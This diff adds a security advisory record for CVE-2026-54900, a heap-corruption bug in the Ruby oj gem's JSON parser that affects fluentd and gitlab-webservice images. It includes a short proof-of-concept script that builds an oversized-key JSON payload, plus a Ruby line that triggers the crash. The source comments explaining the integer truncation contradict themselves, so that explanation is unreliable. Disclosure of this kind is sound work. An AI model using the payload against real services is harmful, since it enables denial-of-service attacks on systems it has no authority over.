@@ -1,0 +1,104 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-td75-tb3w-wtwt-75f5",
+  "modified": "2026-09-21T17:17:10Z",
+  "published": "2026-09-21T17:17:10Z",
+  "upstream": [
+    "CVE-2026-54900"
+  ],
+  "summary": "### Summary",
+  "details": "### Summary\n\n`Oj::Parser#parse` in usual mode with `create_id` enabled is vulnerable to heap corruption via a negative-size `memcpy`. When a JSON object key is exactly 65,535 bytes long, an integer truncation in `form_attr` (`usual.c:63`) converts the length to `-1` before passing it to `memcpy`. This causes `memcpy` to copy `SIZE_MAX` bytes (interpreted as a huge `size_t`), corrupting heap memory and crashing the process.\n\n### Version\n\n- **Software**: oj gem\n- **Affected**: all versions with `ext/oj/usual.c`\n- **Latest tested**: 3.17.1 (confirmed present)\n\n### Details\n\n`ext/oj/usual.c`, `form_attr`:\n\n```c\n// usual.c:55–64\nstatic ID form_attr(const char *str, size_t slen) {\n    char        buf[4096];\n    // ...\n    int  blen = (int)slen + 1;    // ← truncates: 65535 + 1 = 65536 → wraps to 0\n                                  //   or: 65535 cast to int = 65535 (fits),\n                                  //   but blen = 65536 → INT overflow on +1 if slen=INT_MAX\n    // ...\n    memcpy(buf, \"@\", 1);\n    memcpy(buf + 1, str, (size_t)blen);  // ← size_t(-1) = SIZE_MAX\n}\n```\n\nThe cache (`cache_intern`) uses a fixed 65,536-byte slab. When `slen = 65535`, the arithmetic wraps and `memcpy` is called with `(size_t)-1`.\n\nASAN report:\n```\n==80452==ERROR: AddressSanitizer: negative-size-param: (size=-1)\n    #0 memcpy\n    #1 form_attr          /ext/oj/usual.c:63\n    #2 cache_intern       /ext/oj/cache.c:326\n    #3 get_attr_id        /ext/oj/usual.c:186\n    #4 close_object_create  /ext/oj/usual.c:374\n    #5 parse              /ext/oj/parser.c:693\n    #6 parser_parse       /ext/oj/parser.c:1408\n0x531000528800 is located 0 bytes inside of 65536-byte region [0x531000528800, 0x531000538800)\n```\n\n### Reproduce\n\nGenerate the payload:\n\n```python\nkey = 'A' * 65535\nwith open('poc.json', 'w') as f:\n    f.write('{\"json_class\":\"Oj::Bag\",\"' + key + '\":1}')\n```\n\nTrigger:\n\n```ruby\nrequire 'oj'\nOj::Parser.new(:usual, create_id: 'json_class').parse(STDIN.read)\n```",
+  "severity": [
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "fluentd",
+        "purl": "pkg:docker/dhi/fluentd?os_name=debian&os_version=12"
+      },
+      "versions": [
+        "1.18.0-debian12",
+        "1.18.0-dev-debian12-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "fluentd",
+        "purl": "pkg:docker/dhi/fluentd?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "1.18.0-debian13",
+        "1.18.0-dev-debian13-dev",
+        "1.19.0-debian13",
+        "1.19.0-debian13-dev",
+        "1.19.0-dev-debian13-dev",
+        "1.19.1-debian13",
+        "1.19.1-debian13-dev",
+        "1.19.2-debian13",
+        "1.19.2-debian13-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "gitlab-webservice",
+        "purl": "pkg:docker/dhi/gitlab-webservice?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "18.11.1-debian13",
+        "18.11.1-debian13-dev",
+        "18.11.1-debian13-fips",
+        "18.11.1-debian13-fips-dev",
+        "18.11.3-debian13",
+        "18.11.3-debian13-dev",
+        "18.11.3-debian13-fips",
+        "18.11.3-debian13-fips-dev",
+        "18.11.4-debian13",
+        "18.11.4-debian13-dev",
+        "18.11.4-debian13-fips",
+        "18.11.4-debian13-fips-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-td75-tb3w-wtwt-75f5"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-9cv6-qcjw-4grx"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/ohler55/oj/security/advisories/GHSA-9cv6-qcjw-4grx"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://security-tracker.debian.org/tracker/CVE-2026-54900"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://ubuntu.com/security/CVE-2026-54900"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://people.ubuntu.com/~ubuntu-security/cve/CVE-2026-54900"
+    }
+  ]
+}
